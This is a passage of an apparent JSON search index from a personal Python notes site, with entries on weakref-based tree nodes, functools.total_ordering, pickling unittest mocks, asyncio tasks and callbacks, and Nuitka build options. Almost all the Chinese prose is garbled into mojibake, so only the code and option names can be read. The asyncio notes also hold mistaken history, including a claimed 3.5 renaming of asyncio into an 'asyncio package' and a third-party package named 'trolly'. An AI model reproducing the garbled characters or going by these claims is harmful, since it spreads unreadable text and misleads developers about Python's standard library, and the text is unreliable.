‘å½¢æ•°æ®ç»“æ„ï¼Œå¹¶ä¸”å› ä¸ºè¶…è¿‡åµŒå¥—å±‚çº§é™ åˆ¶è€Œå¤±è´¥ã€‚ä½ æƒ³æ¶ˆé™¤é€’å½’ï¼Œå¹¶åŒæ—¶ä¿æŒè®¿é—®è€…ç¼–ç¨‹æ¨¡å¼ã€‚ é€šè¿‡å·§å¦™çš„ä½¿ç”¨ç”Ÿæˆå™¨å¯ä»¥åœ¨æ ‘éå†æˆ–æœç´¢ç®—æ³•ä¸­æ¶ˆé™¤é€’å½’ã€‚ å¾ªç¯å¼•ç”¨æ•°æ®ç»“æ„çš„å†…å­˜ç®¡ç† ç¨‹åºåˆ›å»ºäº†å¾ˆå¤šå¾ªç¯å¼•ç”¨æ•°æ®ç»“æ„ (æ¯”å¦‚æ ‘ã€å›¾ã€è§‚å¯Ÿè€…æ¨¡å¼ç­‰)ï¼Œä½ ç¢°åˆ°äº†å†…å­˜ç®¡ç†éš¾é¢˜ã€‚ ä¸€ä¸ªç®€å•çš„å¾ªç¯å¼•ç”¨æ•°æ®ç»“æ„ä¾‹å­å°±æ˜¯ä¸€ä¸ªæ ‘å½¢ç»“æ„ï¼ŒåŒäº²èŠ‚ç‚¹æœ‰æŒ‡é’ˆæŒ‡å‘å­©å­ èŠ‚ç‚¹ï¼Œå­©å­èŠ‚ç‚¹åˆè¿”å›æ¥æŒ‡å‘åŒäº²èŠ‚ç‚¹ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨ weakref åº“ä¸­çš„ å¼±å¼•ç”¨: import weakref class Node: def __init__(self, value): self.value = value self._parent = None self.children = [] def __repr__(self): return 'Node({!r:})'.format(self.value) # property that manages the parent as a weak-reference @property def parent(self): return None if self._parent is None else self._parent() @parent.setter def parent(self, node): self._parent = weakref.ref(node) def add_child(self, child): self.children.append(child) child.parent = self è¿™ç§æ˜¯æƒ³æ–¹å¼å…è®¸ parent é™é»˜ç»ˆæ­¢ã€‚ä¾‹å¦‚: >>> root = Node('parent') >>> c1 = Node('child') >>> root.add_child(c1) >>> print(c1.parent) Node('parent') >>> del root >>> print(c1.parent) None >>> å¾ªç¯å¼•ç”¨çš„æ•°æ®ç»“æ„åœ¨ Python ä¸­æ˜¯ä¸€ä¸ªå¾ˆæ£˜æ‰‹çš„é—®é¢˜ï¼Œå› ä¸ºæ­£å¸¸çš„åƒåœ¾å›æ”¶æœºåˆ¶ ä¸èƒ½é€‚ç”¨äºè¿™ç§æƒ…å½¢ã€‚ Python æœ‰å¦å¤–çš„åƒåœ¾å›æ”¶å™¨æ¥ä¸“é—¨é’ˆå¯¹å¾ªç¯å¼•ç”¨çš„ï¼Œä½†æ˜¯ä½ æ°¸è¿œä¸çŸ¥é“å®ƒä»€ä¹ˆæ—¶ å€™ä¼šè§¦å‘ã€‚å¦å¤–ä½ è¿˜å¯ä»¥æ‰‹åŠ¨çš„è§¦å‘å®ƒï¼Œä½†æ˜¯ä»£ç çœ‹ä¸Šå»å¾ˆæŒ«: >>> import gc >>> gc.collect() # Force collection Data.__del__ Data.__del__ >>> å¦‚æœå¾ªç¯å¼•ç”¨çš„å¯¹è±¡è‡ªå·±è¿˜å®šä¹‰äº†è‡ªå·±çš„ __del__() æ–¹æ³•ï¼Œé‚£ä¹ˆä¼šè®©æƒ…å†µå˜å¾—æ›´ ç³Ÿç³•ã€‚ å¼±å¼•ç”¨æ¶ˆé™¤äº†å¼•ç”¨å¾ªç¯çš„è¿™ä¸ªé—®é¢˜ï¼Œæœ¬è´¨æ¥è®²ï¼Œå¼±å¼•ç”¨å°±æ˜¯ä¸€ä¸ªå¯¹è±¡æŒ‡é’ˆï¼Œå®ƒä¸ä¼š å¢åŠ å®ƒçš„å¼•ç”¨è®¡æ•°ã€‚ä½ å¯ä»¥é€šè¿‡ weakref æ¥åˆ›å»ºå¼±å¼•ç”¨ è®©ç±»æ”¯æŒæ¯”è¾ƒæ“ä½œ æƒ³è®©æŸä¸ªç±»çš„å®ä¾‹æ”¯æŒæ ‡å‡†çš„æ¯”è¾ƒè¿ç®— (æ¯”å¦‚ >=,!=,<=,< ç­‰)ï¼Œä½†æ˜¯åˆä¸æƒ³å» å®ç°é‚£ä¸€å¤§ä¸¢çš„ç‰¹æ®Šæ–¹æ³•ã€‚ Python ç±»å¯¹æ¯ä¸ªæ¯”è¾ƒæ“ä½œéƒ½éœ€è¦å®ç°ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•æ¥æ”¯æŒã€‚ä¾‹å¦‚ä¸ºäº†æ”¯æŒ >= æ“ ä½œç¬¦ï¼Œä½ éœ€è¦å®šä¹‰ä¸€ä¸ª __ge__() æ–¹æ³•ã€‚å°½ç®¡å®šä¹‰ä¸€ä¸ªæ–¹æ³•æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœè¦ä½ å® ç°æ‰€æœ‰å¯èƒ½çš„æ¯”è¾ƒæ–¹æ³•é‚£å°±æœ‰ç‚¹çƒ¦äººäº†ã€‚ è£…é¥°å™¨ functools.total_ordering å°±æ˜¯ç”¨æ¥ç®€åŒ–è¿™ä¸ªå¤„ç†çš„ã€‚ä½¿ç”¨å®ƒæ¥è£…é¥°ä¸€ä¸ª æ¥ï¼Œä½ åªéœ€å®šä¹‰ä¸€ä¸ª __eq__() æ–¹æ³•ï¼Œå¤–åŠ å…¶ä»–æ–¹æ³• (__lt__, __le__, __gt__, or __ge__) ä¸­çš„ä¸€ä¸ªå³å¯ã€‚ç„¶åè£…é¥°å™¨ä¼šè‡ªåŠ¨ä¸ºä½ å¡«å……å…¶å®ƒæ¯”è¾ƒæ–¹æ³•ã€‚ åˆ›å»ºç¼“å­˜å®ä¾‹ åœ¨åˆ›å»ºä¸€ä¸ªç±»çš„å¯¹è±¡æ—¶ï¼Œå¦‚æœä¹‹å‰ä½¿ç”¨åŒæ ·å‚æ•°åˆ›å»ºè¿‡è¿™ä¸ªå¯¹è±¡ï¼Œä½ æƒ³è¿”å›å®ƒçš„ç¼“ å­˜å¼•ç”¨ è¦ä½¿ç”¨ä¸€ä¸ªå’Œç±»æœ¬èº«åˆ†å¼€çš„å·¥å‚å‡½æ•° è™‘é‡æ–°å®šä¹‰ç±»çš„ __new__() æ–¹æ³•, ä¸è¿‡æœ‰ä¸ªé—®é¢˜æ˜¯ __init__() æ¯æ¬¡éƒ½ä¼šè¢«è°ƒç”¨ï¼Œä¸ç®¡è¿™ä¸ªå®ä¾‹æ˜¯å¦è¢«ç¼“å­˜äº† (ä¸€ä¸ªè§£å†³åŠæ³•æ˜¯, ä»…ä½¿ç”¨__new__æ¥å®ä¾‹)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Class-and-object.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Class-and-object.html"},{"title":"unittest","text":"mock å®˜ç½‘æ–‡æ¡£:: unittest.mock-ä¸Šæ‰‹æŒ‡å— æ¨¡æ‹Ÿæ–¹æ³•è°ƒç”¨, æ¯”å¦‚æµ‹è¯•çš„æ—¶å€™, åªæƒ³æµ‹è¯•æŸä¸€ä¸ªç±», ä½†æ˜¯ç±»æœ‰ç›¸å…³è”çš„å…¶ä»–ç±», é‚£ä¹ˆå¯ä»¥ä½¿ç”¨ Mock() æ¥ä»£æ›¿å…¶ä»–ç±». è®°å½•ä¸€äº›å‘ Can't pickle <class 'mock.Mock'> æŠ¥é”™: pickle.PicklingError: Can't pickle <class 'mock.Mock'>: it's not the same object as mock.Mock ç±»ä¼¼è¿™ç§ pickle åºåˆ—åŒ–æŠ¥é”™, å¤§éƒ¨åˆ†æ˜¯åœ¨ /docs/åç«¯/python/æ¦‚å¿µç›¸å…³/å¤šè¿›ç¨‹ ä¸‹è¿›è¡Œæµ‹è¯•è€Œå‡ºç°çš„åºåˆ—åŒ–é—®é¢˜ ä½†æ˜¯è¿™é‡Œæ˜¯ Mock æœ¬èº«çš„é—®é¢˜, ä½¿ç”¨ä»¥ä¸‹æ–¹å¼è§£å†³: class PickableMock(Mock): def __reduce__(self): return (Mock, ()) å¯å‚è€ƒè§£å†³åœ°å€:: Can't pickle MagicMock or Mock #139","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-Unittest.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-Unittest.html"},{"title":"asyncio","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/asyncio.html ä½å±‚apiç´¢å¼•: https://docs.python.org/zh-cn/3/library/asyncio-llapi-index.html è¿™éƒ¨åˆ†å±äºåç¨‹, ç›¸å…³ä»‹ç»å¯è§: /docs/åç«¯/python/æ¦‚å¿µç›¸å…³/åç¨‹ åŒ…é—®é¢˜ å¦‚æœå°è¯•ç”¨pipå®‰è£…è¿‡, ä¼šå‘ç°asyncioç›®å‰åŒæ—¶å­˜åœ¨äºPythonæ ‡å‡†åº“å’Œä¸‰æ–¹åŒ…ä¸­, è¿™æ˜¯å› ä¸º: Python 3.4å¼•å…¥äº†asyncioæ¨¡å—,è¿™æ˜¯asyncioæœ€åˆå‡ºç°åœ¨Pythonæ ‡å‡†åº“çš„å½¢å¼ã€‚ åœ¨Python 3.5ä¸­,asyncioæ¨¡å—è¢«é‡æ„,å¹¶æ›´åä¸ºasyncio packageã€‚è¿™æ˜¯ç›®å‰Pythonæ ‡å‡†åº“ä¸­æ¨èä½¿ç”¨çš„asyncioå½¢å¼ã€‚ æ­¤å¤–,è¿˜å­˜åœ¨ä¸‰æ–¹åŒ…asyncioå’Œtrolly,å®ƒä»¬åœ¨Python 3.3ä¹‹å‰å®ç°äº†asyncioåŠŸèƒ½ã€‚ æ‰€ä»¥,ç›®å‰asyncioä¸»è¦æœ‰è¿™ä¸‰ç§å½¢å¼: Python 3.4ä¸­çš„asyncioæ¨¡å—(å·²è¿‡æ—¶) Python 3.5+ä¸­çš„asyncio package(æ¨è) ä¸‰æ–¹åŒ…asyncioå’Œtrolly(ä»…ç”¨äºPython 3.3ä¹‹å‰) åº”è¯¥å…³æ³¨å¹¶ä½¿ç”¨çš„æ˜¯Python 3.5+ä¸­çš„asyncio packageã€‚å®ƒæ˜¯å®˜æ–¹æ”¯æŒå’Œæ¨èçš„asyncioå½¢å¼,å…·æœ‰æ›´ä¸°å¯Œçš„åŠŸèƒ½å’Œæ›´é«˜çš„æ€§èƒ½ã€‚ ä¸‰æ–¹åŒ…asyncioå’Œtrollyç”±äºå…¼å®¹æ€§é—®é¢˜,å·²ç»å¾ˆå°‘å†è¢«ä½¿ç”¨ã€‚è€Œasyncioæ¨¡å—ç”±äºè®¾è®¡é—®é¢˜,å·²åœ¨Python 3.5ä¸­è¢«æ›´åå’Œé‡æ„ã€‚ awaitå’Œcreate_taskçš„åŒºåˆ« await: å½“å‰ä»£ç åœ¨æ­¤å¤„æŒ‚èµ·(é˜»å¡), ç­‰å¾…awaitçš„è¯­å¥æ‰§è¡Œå®Œæˆ. ç¨‹åºä¸­æ—¶é—´å¾ªç¯ä¸­çš„å…¶ä»–è¯­å¥å¯ä»¥åœ¨è¿™æ—¶å€™æ‰§è¡Œ. ç›´åˆ°awaitçš„è¯­å¥æ‰§è¡Œå®Œæˆ(å¦‚æœä¸€ä¸‹å°±æ‰§è¡Œå®Œäº†, é‚£ä¹ˆå¯ä»¥è¯´æ²¡æœ‰ç­‰å¾…) ä½†åªèƒ½ç”¨åœ¨ async æ–¹æ³•ä½“å†… create_task: åˆ›å»ºä¸€ä¸ªä»»åŠ¡, æäº¤ç»™äº‹ä»¶å¾ªç¯é˜Ÿåˆ—(ä¸Šä¸‹æ–‡ç¯å¢ƒå¤åˆ¶ä¸€ä»½ç»™äº‹ä»¶å¾ªç¯), äº‹ä»¶å¾ªç¯è‡ªåŠ¨è°ƒåº¦, ä¸é˜»å¡ åŒæ­¥å¼‚æ­¥æ–¹æ³•å†…çš†å¯ç”¨ å¯ç­‰å¾…å¯¹è±¡ å¯ç­‰å¾…å¯¹è±¡æœ‰ coroutine/future/task å…¶ä¸­taskæ˜¯futureçš„å­ç±» ä»»åŠ¡å›è°ƒ task.add_done_callback å®Œæˆåçš„å›è°ƒå¦‚ä½•è‡ªå®šä¹‰å‚æ•°, ä½¿ç”¨ functools.partial åå‡½æ•°æ¥æ’å…¥å‚æ•°ï¼Œ æ­¤å¤„æ­£å¸¸æƒ…å†µçš„å‚æ•°åªæœ‰ä¸€ä¸ª future å¯¹è±¡è¡¨ç¤ºå®ƒæœ¬èº«è¿™ä¸ª task: # æ’å…¥å‚æ•°åï¼Œ å®é™…å›è°ƒçš„å‚æ•°åˆ—è¡¨ä¸º (_num, task), ä¹Ÿå°±æ˜¯ (10, task) task.add_done_callback(functools.partial(cls._set_num1, 10)) å¤šçº¿ç¨‹çš„äº‹ä»¶å¾ªç¯ ä¸€èˆ¬è€Œè¨€, åªèƒ½æ˜¯ä¸»çº¿ç¨‹æ‹¥æœ‰è‡ªå·±çš„äº‹ä»¶å¾ªç¯, å­çº¿ç¨‹æ— æ³•è·å–ä¸»çº¿ç¨‹çš„loop, è‹¥å­çº¿ç¨‹éœ€è¦, å¯ä»¥åœ¨æ–°å»ºä¸€ä¸ªloopç»™å­çº¿ç¨‹ä½¿ç”¨, å°¤å…¶æ˜¯guiç¼–ç¨‹çš„æ—¶å€™, ä¸€èˆ¬guiçº¿ç¨‹åªèƒ½åœ¨ä¸»çº¿ç¨‹è·‘(é™¤éæä¾›äº†ç‰¹æ®Šæ”¯æŒ), é‚£ä¹ˆå½“å­˜åœ¨å…¨å±€çš„éguièƒ½å¤„ç†çš„å®æ—¶ç›‘å¬æ—¶, é‚£ä¹ˆå°±åªèƒ½åœ¨å­çº¿ç¨‹è·‘äº†(æˆ–è€…æ–°å»ºä¸€ä¸ªè¿›ç¨‹, è‡³å°‘ç›®å‰æˆ‘æ˜¯æ²¡æœ‰å…¶ä»–åŠæ³•) äº‹ä»¶å¾ªç¯å¢åŠ ä¿¡å·ç›‘å¬ code: import signal loop.add_signal_handler(signal.SIGTERM, hander) ä¸socketåä½œ code: _sock: socket.socket loop.sock_recv(_sock, 1024) å¹¶å‘æ‰§è¡Œ(å‡å¹¶å‘) ä½¿ç”¨ asyncio.gather åŒæ—¶è¿è¡Œä¸¤ä¸ªåç¨‹ä»»åŠ¡: tasks = [task1(), task2()] loop.run_until_complete(asyncio.gather(*tasks)) åˆ›å»ºsocket-udpäº‹ä»¶ ä½¿ç”¨ loop.create_datagram_endpoint eg: loop.create_datagram_endpoint( lambda: OrdinaryProtocol(), local_addr=('0.0.0.0', 0), ) æ³¨æ„ protocol_factory å¿…é¡»ä¸ºä¸€ä¸ªè¿”å› åè®® å®ç°çš„å¯è°ƒç”¨å¯¹è±¡, åè®® å®ç°æ˜¯æŒ‡å®ç° asyncio.protocols ä¸‹çš„éœ€è¦çš„åè®®, åè®®çš„åŸºç±»æ˜¯ asyncio.protocols.BaseProtocol å¦‚udpç¼–ç¨‹ä½¿ç”¨ åè®® å®ç°asyncio.protocols.DatagramProtocol è¿™é‡Œæ˜¯ OrdinaryProtocol() å°±æ˜¯å®ç°çš„ DatagramProtocol: class DatagramProtocol(DatagramProtocol): def __init__(self): self._transport: Optional[DatagramTransport] = None self._udp_socket: Optional[DatagramTransport] = None def connection_made(self, transport: transports.DatagramTransport) -> None: self._transport = transport def datagram_received(self, data: bytes, addr: tuple[str, int]) -> None: _LOGGER.debug(f'datagram_received:: addr: {addr} ; data: {data}') def connection_lost(self, exc: Optional[Exception]) -> None: ... async def close(self): self._transport.close() åˆ¤æ–­æ˜¯å¦æ˜¯åç¨‹ å¯ä½¿ç”¨ asyncio çš„ iscoroutinefunction: async def async_func(): ... asyncio.iscoroutinefunction(async_func) # True æˆ–è€…inspect çš„æ£€æŸ¥: inspect.iscoroutinefunction(async_func)) # True å¦‚æœè¦ä½¿ç”¨ç±»å‹æ³¨è§£, å‚è§ CR_Callable","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-asyncio.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-asyncio.html"},{"title":"nuitka","text":"nuitkaä¸­æ–‡å®˜ç½‘: https://nuitka.net/zh_CN/index.html Nuitka æ˜¯ä¸€ä¸ªå°† Python ä»£ç ç¼–è¯‘æˆ C æˆ– C++ ä»£ç çš„å·¥å…·. å¯ä»¥äº«å—åˆ°pythonçº§åˆ«çš„å¼€å‘é€Ÿåº¦ï¼Œcçº§åˆ«çš„è¿è¡Œé€Ÿåº¦ Mac ä¸‹å®‰è£…: pip install nuitka é¢å¤–å»ºè®®å®‰è£…orderedsetï¼Œ è¿™ä¸ªæ˜¯ä½¿ç”¨çš„æ—¶å€™å»ºè®®å®‰è£…, åŸå› : Nuitka:WARNING: Using very slow fallback for ordered sets, please install 'orderedset' PyPI package for best Python compile time performance: pip install orderedset ç®€å•ä½¿ç”¨ å½“å‰ç³»ç»Ÿç‰ˆæœ¬å®‰è£…çš„æ˜¯python3ç‰ˆæœ¬çš„ï¼Œæ‰€ä»¥äºä¹‹å‰ç›´æ¥ç”¨ nuitkaè¿è¡Œä¸ä¸€è‡´ï¼Œç°åœ¨æ˜¯nuitka3. æœ€ç®€å•çš„ç¼–è¯‘ä¸€ä¸ªpythonæ–‡ä»¶: nuitka3 xxx.py Winä½¿ç”¨çš„æ—¶å€™ä¼šæç¤ºå®‰è£… ccacheæ¥åŠ é€Ÿï¼Œæ ¹æ®æç¤ºè¾“å…¥å®‰è£…å°±æ˜¯äº†ï¼Œ æˆ‘çš„æ˜¯åœ¨ ' https://nuitka.net/ccache/v4.2.1/ccache-4.2.1.zip ' è‡ªåŠ¨ä¸‹è½½å®‰è£… æ‰§è¡ŒæˆåŠŸåä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆç›¸åº”çš„å¯æ‰§è¡Œæ–‡ä»¶å’Œç¼–è¯‘æ–‡ä»¶å¤¹ï¼Œxxx.binï¼ˆwinä¸‹æ˜¯exeæ–‡ä»¶ï¼‰è·Ÿxxx.buildï¼Œ å‘½ä»¤é€‰é¡¹ å¦‚: nuitka --standalone --show-progress --show-memory --plugin-enable=tk-inter --include-data-dir=resource=resource --onefile trigger-angle.py python -m nuitka --standalone --show-progress --show-memory --plugin-enable=pyqt5 --windows-icon-from-ico=res/icon.ico --include-data-dir=jsons=jsons --include-data-dir=pyqt=pyqt --include-data-dir=res=res --windows-disable-console --onefile .\\main_pyqt.py å¸¸ç”¨ --module= <file> æŒ‡å®šä¸»æ–‡ä»¶(å…¥å£æ–‡ä»¶), æ¯”å¦‚main.py --standalone , -s ç”Ÿæˆç‹¬ç«‹çš„å¯æ‰§è¡Œæ–‡ä»¶(åŒ…å«æ‰€æœ‰ä¾èµ–é¡¹, ä½¿ç›®æ ‡æœºå™¨ä¸éœ€è¦è‡ªå·±å®‰è£…Pythonå³å¯è¿è¡Œ) --onefile æ˜¯å¦æ‰“åŒ…ä¸ºä¸€ä¸ªå•ç‹¬çš„ exe æ–‡ä»¶(åƒpyinstallerä¸€æ ·)ï¼Œ é»˜è®¤ç”Ÿæˆä½ç½®æ˜¯åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹ --output-dir= <dir> , -o <dir> è¾“å‡ºç›®å½•, ç”Ÿæˆexeåˆ° diræ–‡ä»¶å¤¹ ä¸‹é¢å» --plugin-enable= <plugin> æ‰‹åŠ¨æŒ‡å®šéœ€è¦ç¼–è¯‘çš„ä¸‰æ–¹åŒ…æ¨¡å—, æ¯”å¦‚ä¸€äº›GUIæ¨¡å—tkinter, numpy, pytorch å¦‚: --plugin-enable=tk-inter --include-files æŒ‡å®šæ–‡ä»¶åŒ…å«åˆ°ç¼–è¯‘è¾“å‡º --include-data-file= <source=target> åŒ…å«çš„æ–‡ä»¶å¤¹, ä¼šç›´æ¥å¤åˆ¶è¿‡å» sourceä»£è¡¨å½“å‰(ç¼–è¯‘å‰çš„æºä»£ç é˜¶æ®µ)ä½ç½®; targetä»£ç ç¼–è¯‘åæ”¾ç½®çš„ä½ç½®, æ³¨æ„ = ä¸èƒ½ç”šçœç•¥. --show-memory æŸ¥çœ‹ç¼–è¯‘æ—¶å†…å­˜å ç”¨ --show-progress æŸ¥çœ‹ç¼–è¯‘è¿›åº¦, æ˜¾ç¤ºè¿›åº¦æ¡ --remove-output , -x åˆ é™¤ç¼–è¯‘åçš„æ–‡ä»¶. --python-flag= <FLAG> , -k <FLAG> ä½¿ç”¨æŒ‡å®š Python è§£é‡Šå™¨ç¼–è¯‘. --show-scons æ˜¾ç¤º Scons å‘½ä»¤åŠå…¶å‚æ•°ï¼Œæ–¹ä¾¿è°ƒè¯•. --recurse-all , -r é€’å½’å¤„ç†æ‰€æœ‰å¯¼å…¥è¿‡çš„æ¨¡å— --show-modules , -m æ˜¾ç¤ºè¦ç¼–è¯‘çš„æ‰€æœ‰æ¨¡å— --experimental-annotations , -e a å¯ç”¨å®éªŒæ€§çš„ç±»å‹æ³¨é‡ŠåŠŸèƒ½. å³æ˜¯å¦å°†Pythonä»£ç ä¸­å·²æœ‰çš„ ç±»å‹æ³¨è§£è½¬æ¢ä¸ºC(++)çš„å¼ºç±»å‹å®šä¹‰. --no-pyi-file , -n p ä¸ç”Ÿæˆ.pyiæ–‡ä»¶ --lto= <[yes,no]> æ˜¯å¦å¯ç”¨é“¾æ¥æ—¶ä¼˜åŒ–ï¼ˆLink Time Optimizationï¼ŒLTOï¼‰. å®ƒçš„ä½œç”¨æ˜¯åœ¨é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå¯¹æ•´ä¸ªç¨‹åºè¿›è¡Œå…¨å±€ä¼˜åŒ–ï¼Œä»¥è¾¾åˆ°æ›´å¥½çš„æ€§èƒ½ã€‚ ä¼šå¢åŠ é¢å¤–çš„ç¼–è¯‘æ—¶é—´æ¶ˆè€—. å¯ç”¨å(yes)ï¼Œnuitka ä¼šåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ç”Ÿæˆ LLVM bitcode æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨ LLVM å·¥å…·é“¾è¿›è¡Œé“¾æ¥ã€‚ LLVM æä¾›äº†ä¸€ç§è·¨å¹³å°çš„é“¾æ¥æ—¶ä¼˜åŒ–æŠ€æœ¯ï¼Œå¯ä»¥å¯¹å„ä¸ªæ¨¡å—ä¹‹é—´çš„å‡½æ•°è°ƒç”¨å…³ç³»å’Œæ•°æ®ä¾èµ–å…³ç³»è¿›è¡Œåˆ†æï¼Œ ä»è€Œè¿›è¡Œæ›´åŠ æœ‰æ•ˆçš„ä¼˜åŒ–ã€‚ --debug å¯ç”¨ç¼–è¯‘åçš„å¯æ‰§è¡Œæ–‡ä»¶çš„è¿è¡Œæ—¶è°ƒè¯•æ”¯æŒ(ä¹Ÿå°±æ˜¯è°ƒè¯•ç›¸å…³çš„ç¬¦å·è¡¨, æ²¡æœ‰çš„è¯æ²¡æ³•gdbè°ƒè¯•) --python-debug ç”¨äºç”Ÿæˆå¯ä»¥è¿›è¡Œè°ƒè¯•çš„ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæˆ–è€….so/.dllåº“æ–‡ä»¶ï¼‰ã€‚ å®ƒä¼šä¿ç•™æºä»£ç ä¸­çš„æ‰€æœ‰è°ƒè¯•ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡Œå·ã€å˜é‡åç§°ç­‰ .. å¯ä»¥åœ¨ Python è°ƒè¯•å™¨ä¸­è¿›è¡Œè°ƒè¯•, å¥½åƒåªèƒ½è®¾ç½®è¿œç¨‹è°ƒè¯•æœåŠ¡å™¨, å¾…æµ‹è¯• åŒ…å«/å¯¼å…¥æ¨¡å—/åŒ… --include-package= PACKAGE æ˜¾ç¤ºæŒ‡å®šéœ€è¦åŒ…å«çš„æ•´ä¸ªåŒ…. é»˜è®¤ä¸ºç©º. å¤åˆ¶æ¯”å¦‚numpy,PyQt5 è¿™äº›å¸¦å­æ–‡ä»¶å¤¹çš„åŒ… e.g. \"some_package.sub_package\". Python å°†ä¼šå¯»æ‰¾å¹¶åŒ…å«åˆ°ç¼–è¯‘è¾“å‡º. ä¸ºäº†é¿å…å¯¼å…¥ä¸éœ€è¦çš„åŒ…, å¯ä»¥ä½¿ç”¨, å¦‚ \"--nofollow-import-to=*.tests\". --include-module= MODULE åŒ…æ‹¬å•ä¸ªæ¨¡å—ã€‚ä»¥ä¸€ä¸ªPythonå‘½åç©ºé—´ç»™å‡ºï¼Œ å¤åˆ¶æ¯”å¦‚when.py è¿™ç§ä»¥.pyç»“å°¾çš„æ¨¡å—. ä¾‹å¦‚\"Some_Package.Some_Module\"ï¼Œç„¶åNuitkaå°† æ‰¾åˆ°å®ƒå¹¶å°†å…¶åŒ…å«åœ¨äºŒè¿›åˆ¶æˆ–æ‰©å±•ä¸­ æ¨¡å—ï¼Œå¹¶ä½¿å…¶å¯é€šè¿‡ä»¥ä¸‹æ–¹å¼å¯¼å…¥ å¯†ç ã€‚é»˜è®¤ä¸ºç©ºã€‚ --include-plugin-directory= <MODULE/PACKAGE> å¦å¤–åŒ…å«æŒ‡å®šè·¯å¾„çš„ä¸‹çš„åŒ…/æ¨¡å—. æ­¤å¤„æ‰¾åˆ°çš„å°†ä¼šè¦†ç›–åŸæ¥æœ‰çš„. å¯æŒ‡å®šå¤šæ¬¡. é»˜è®¤ä¸ºç©º. --include-plugin-files= PATTERN åŒ…å«æ–‡ä»¶å†…èƒ½åŒ¹é… PATTERN çš„. ä¼šè¦†ç›–åŸæœ‰çš„ . å¯æŒ‡å®šå¤šæ¬¡. é»˜è®¤ä¸ºç©º. --prefer-source-code å¯¹äºå·²ç»ç¼–è¯‘å¥½çš„æ‹“å±•æ¨¡å—, ä¸è®ºæ˜¯æºæ–‡ä»¶è¿˜æ˜¯æ‹“å±•æ¨¡å—, éƒ½æ­£å¸¸ä½¿ç”¨. ä¼šæ¯”ç›´æ¥ä»å¯ç”¨æºæ–‡ä»¶ç¼–è¯‘è¦å¥½?(è¿™é‡Œæ²¡æ‡‚). å¦‚æœä¸å¸Œæœ›ï¼Œæœ‰--noprefer-source-code æ¥ç¦ç”¨æœ‰å…³å®ƒçš„è­¦å‘Šã€‚ é»˜è®¤ off. æ§åˆ¶è·Ÿè¸ªå¯¼å…¥çš„æ¨¡å— ä»€ä¹ˆå«è·Ÿè¸ªå¯¼å…¥? è§: CR_Python_è·Ÿè¸ªå¯¼å…¥ --follow-stdlib= <{yes,no}> æ˜¯å¦åŒ…å«æ•´ä¸ª Python æ ‡å‡†åº“, ä¼šå¢åŠ å¾ˆå¤šæ—¶é—´. é»˜è®¤å…³é—­. å€¼ä¸º yes/no. --nofollow-imports ä»…ç¼–è¯‘æºä»£ç ï¼Œè€Œä¸ä¼šå°è¯•è·Ÿè¸ªå¯¼å…¥çš„ä»»ä½•æ¨¡å—/åŒ…. ä½¿ç”¨æ­¤é€‰é¡¹æ—¶, è‹¥ä»£ç ä¾èµ–äºå…¶ä»–åº“æˆ–æ¨¡å—ï¼Œåˆ™å¿…é¡»æ‰‹åŠ¨å°†å®ƒä»¬åŒ…å«åœ¨ç¼–è¯‘åçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼Œåªæœ‰åœ¨ç¡®å®šæ‰€æœ‰ä¾èµ–é¡¹éƒ½å·²æ­£ç¡®å®‰è£…å¹¶ä¸”æ‚¨ä¸éœ€è¦å°†ä»£ç æ‰“åŒ…åˆ°ç‹¬ç«‹çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­æ—¶ï¼Œ æ‰åº”ä½¿ç”¨æ­¤é€‰é¡¹ã€‚ é»˜è®¤å…³é—­. --follow-imports , -f è·Ÿè¸ªæ‰€æœ‰å¯¼å…¥çš„æ¨¡å—/åŒ…ï¼Œå¹¶å°†å®ƒä»¬ä¹Ÿç¼–è¯‘ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶. è‹¥ç¨‹åºä¾èµ–äºå…¶ä»–åº“æˆ–æ¨¡å—ï¼Œåˆ™å¿…é¡»ä½¿ç”¨æ­¤é€‰é¡¹ä»¥ç¡®ä¿æ‰€æœ‰ä¾èµ–é¡¹éƒ½è¢«æ­£ç¡®åœ°ç¼–è¯‘åˆ°ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ è¿™ä¸ªé€‰é¡¹å¯ä»¥ç¡®ä¿ä½ çš„ç¨‹åºèƒ½å¤Ÿå®Œå…¨ç‹¬ç«‹è¿è¡Œï¼Œè€Œä¸éœ€è¦ä¾èµ–äºä»»ä½•å¤–éƒ¨åº“æˆ–ç¯å¢ƒã€‚ é»˜è®¤å…³é—­. --follow-import-to= <MODULE/PACKAGE> æŒ‡å®šæœç´¢æ¨¡å—æ—¶çš„æœç´¢è·¯å¾„, ä»å½“å‰è·¯å¾„å¼€å§‹, è¯¦è§: follow-import-to å¯å¤šæ¬¡æŒ‡å®š, é»˜è®¤ä¸ºç©º. --nofollow-import-to= <MODULE/PACKAGE> ä¸ä»è·¯å¾„å¯¼å…¥. å¯æŒ‡å®šå¤šä¸ª, é»˜è®¤ä¸ºç©º. æ•°æ®æ–‡ä»¶ è¿™é‡Œçš„æ•°æ®æ–‡ä»¶é€šå¸¸æ˜¯æŒ‡ å¿…è¦çš„èµ„æºæ–‡ä»¶ , å¦‚å›¾ç‰‡, é…ç½®æ–‡ä»¶. --include-package-data= PACKAGE åŒ…å«æŒ‡å®š PACKAGE ä¸‹çš„æ‰€æœ‰æ•°æ®æ–‡ä»¶. 